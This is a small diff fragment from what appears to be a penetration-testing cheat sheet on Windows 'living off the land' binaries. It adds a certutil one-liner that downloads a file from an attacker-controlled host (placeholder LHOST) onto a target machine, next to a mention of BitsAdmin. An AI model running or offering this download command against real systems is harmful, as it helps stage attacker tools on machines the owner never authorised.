@@ -54,5 +54,5 @@ chk.exe", "C:\lec\accesschk.exe")
 
 
 #### Windows lol
-Certutil 
-bitsadmin
+BitsAdmin 
+```certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>```
